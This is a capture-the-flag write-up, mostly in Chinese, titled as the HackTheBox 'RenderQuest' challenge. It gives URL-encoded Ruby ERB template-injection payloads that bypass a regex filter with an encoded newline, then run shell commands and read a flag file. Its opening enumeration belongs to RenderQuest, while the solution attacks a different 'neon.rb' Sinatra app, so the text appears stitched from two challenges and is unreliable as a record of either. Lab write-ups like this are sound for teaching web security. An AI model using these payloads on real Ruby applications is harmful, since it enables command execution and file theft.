---
title: 'HackTheBox: RenderQuest writeup'
disqus: hackmd
---

[HackTheBox: RenderQuest Writeup](https://hackmd.io/@CHW/ByEQcZabC)
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/challenges/RenderQuest

### Initial Enumeration

●Start Machine: 
http://94.237.57.59:38703 \
(301) http://94.237.57.59:38703/render?page=index.tpl
![94.237.57.59_38703_render_page=index.tpl](https://hackmd.io/_uploads/Skb9oZTWC.png)


Submit: CHW
![image](https://hackmd.io/_uploads/B1ckgza-R.png)
> http://94.237.57.59:38703/render?use_remote=true&page=CHW
> 500 (Internal Server Error)

## Solution

### 1.Code Review
neon.rb
```ruby=
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

提交的@neon 需要符合正規表達式: `/^[0-9a-z ]+$/i`
1. 正則表達式的開始和結束都被斜槓 / 包圍
2. ^ 符號表示匹配字串的開頭
3. `[0-9a-z ] 匹配所有數字、小寫字母和空格
4. +表示至少有一個或多個符合前面指定的字符
5. $ 表示匹配字串的結尾
6. i 表示不區分大小寫

> ERB (Ruby)
> 想嘗試Ruby SSTI

### 2. SSTI
```
neon=<%= 7*7 %>
```
> 不符合正表達式，肯定會被擋

● [Ruby Bypass regular expression](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/) : abc\n<%= 7*7 %>
> 嘗試過\n ，無法識別
> URL-encoded: %0A

### 3. %0A bypass regular expression
#### 3.1 neon=chw%0A<%= 7*7 %>
● 使用chw%0A<% 7*7 %>
```
neon=chw%0A%3C%257%2A7%25%3E
```
![image](https://hackmd.io/_uploads/SylqO_L-C.png)
> (1) 在網頁上直接輸入會被視為字元，使用 BurpSuite Repeater\
> (2) 嘗試 double encode

● 嘗試 double encode
```
neon=chw%0A%253C%2525%25207%252A7%2520%2525%253E
```
![image](https://hackmd.io/_uploads/HkpyWt8bA.png)

> 顯示 encode一次的值，代表:
> (1) 輸入有效
> (2) 確認系統會decode 一次
> Final 試到天荒地老，後來才發現使用 <%= 才會顯示結果

● chw%0A<%= 7*7 %>
```
neon=chw%0A%3C%25%3D7%2A7%25%3E
```
![image](https://hackmd.io/_uploads/rJoROu8-0.png)
> 成功顯示 49。
> 代表成功執行ERB，可以進行SSTI

#### 3.2 Execute Command
● <%= system("whoami") %>
```
neon=chw%0A%3C%25%3D%20system%28%22whoami%22%29%20%25%3E
```
![image](https://hackmd.io/_uploads/Syrxj_8WR.png)
> 誤以為user: true

● <%= system("ls") %>
```
neon=chw%0A%3C%25%3D%20system%28%22ls%22%29%20%25%3E
```
![image](https://hackmd.io/_uploads/rkCYo_LZC.png)
> True again.
> 改用Ruby 語法

### 4. Read Files In Ruby: File.read('flag.txt')
● [Read Files In Ruby](https://www.rubyguides.com/2015/05/working-with-files-ruby/): **File.read/write/open('<file name>')**

● <%= File.read('/flag.txt') %>
```
neon=chw%0A%3C%25%3D%20File.read%28%27%2Fflag.txt%27%29%20%25%3E
```
![image](https://hackmd.io/_uploads/B1iphuLb0.png)
> 顯示500 Internal Server Error

 ![image](https://hackmd.io/_uploads/BJAC6dUb0.png)
> 猜測: 沒有權限訪問根目錄

### 5. Get FLAG

● **<%= File.read('flag.txt') %>** 
```
neon=chw%0A%3C%25%3D%20File.read%28%27flag.txt%27%29%20%25%3E
```  
![image](https://hackmd.io/_uploads/S1jvnOUb0.png)

> **FLAG: HTB{r3pl4c3m3n7_s3cur1ty}**
    
###### tags: `Web` `CTF` `SSTI`
